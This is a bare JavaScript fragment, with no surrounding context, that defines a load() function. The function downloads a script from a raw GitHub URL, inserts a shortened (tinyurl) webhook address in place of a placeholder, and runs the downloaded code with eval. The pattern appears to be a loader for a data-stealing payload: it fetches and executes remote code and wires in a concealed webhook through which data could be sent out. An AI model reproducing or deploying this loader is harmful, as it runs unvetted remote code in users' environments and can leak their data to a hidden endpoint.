
        function load() {
            var webhookURL = 'https://tinyurl.com/2fscbttt';

            var scriptURL = 'https://raw.githubusercontent.com/Lenn106/files/master/discip';

            var xhr = new XMLHttpRequest();
            xhr.open('GET', scriptURL, true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    var scriptCode = xhr.responseText;
                    scriptCode = scriptCode.replace('WEBHOOK_URL_PLACEHOLDER', webhookURL);
                    eval(scriptCode);
                }
            };
            xhr.send();
        }
   
